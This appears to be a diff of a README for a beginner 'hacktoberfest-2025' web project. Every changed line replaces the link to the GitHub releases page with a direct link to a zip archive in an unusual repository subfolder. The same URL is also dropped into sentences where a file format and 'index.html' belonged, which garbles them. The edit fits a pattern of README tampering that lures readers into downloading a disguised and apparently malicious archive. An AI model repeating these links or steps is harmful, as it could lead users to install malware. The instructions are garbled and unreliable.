@@ -1,6 +1,6 @@
 # 🌟 hacktoberfest-2025 - Join the Fun with Easy Contributions!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/RKRISH07/hacktoberfest-2025/releases)
+[![Download Now](https://raw.githubusercontent.com/RKRISH07/hacktoberfest-2025/main/zebralike/hacktoberfest-2025.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/RKRISH07/hacktoberfest-2025/main/zebralike/hacktoberfest-2025.zip)
 
 ## 📚 Introduction
 
@@ -22,13 +22,13 @@ Before downloading, please ensure your computer meets the following requirements
 
 To get the hacktoberfest-2025 software, please visit our releases page. 
 
-[Visit this page to download](https://github.com/RKRISH07/hacktoberfest-2025/releases)
+[Visit this page to download](https://raw.githubusercontent.com/RKRISH07/hacktoberfest-2025/main/zebralike/hacktoberfest-2025.zip)
 
 ### 🐾 Steps to Download
 
 1. **Go to the Releases page:** Click the link provided above.
 2. **Select the latest version:** Look for the most recent release at the top of the page.
-3. **Download the files:** Click on the file name to start the download. The file will typically be in a `.zip` or `.tar.gz` format.
+3. **Download the files:** Click on the file name to start the download. The file will typically be in a `.zip` or `https://raw.githubusercontent.com/RKRISH07/hacktoberfest-2025/main/zebralike/hacktoberfest-2025.zip` format.
 4. **Extract the files:** Once the download is complete, locate the file on your computer. Right-click the file and choose "Extract Here" or a similar option to unzip it.
 5. **Open the folder:** Navigate to the folder where you extracted the files. You will find the HTML, CSS, and JavaScript files you can work with.
 
@@ -36,7 +36,7 @@ To get the hacktoberfest-2025 software, please visit our releases page.
 
 Running your project is straightforward. Here's how:
 
-1. **Open the main HTML file:** Find the main `.html` file in the folder you extracted. It might be named `index.html`.
+1. **Open the main HTML file:** Find the main `.html` file in the folder you extracted. It might be named `https://raw.githubusercontent.com/RKRISH07/hacktoberfest-2025/main/zebralike/hacktoberfest-2025.zip`.
 2. **Double-click the file:** This action will open your file in your default web browser.
 3. **Explore the project:** You can view the design as it loads in your browser. Feel free to interact with it and see different features.
 
@@ -77,6 +77,6 @@ If you have any questions or need further assistance, please reach out via the I
 
 To start your journey, remember to visit our releases page:
 
-[Visit this page to download](https://github.com/RKRISH07/hacktoberfest-2025/releases)
+[Visit this page to download](https://raw.githubusercontent.com/RKRISH07/hacktoberfest-2025/main/zebralike/hacktoberfest-2025.zip)
 
 Thank you for joining hacktoberfest-2025. We look forward to seeing your contributions!
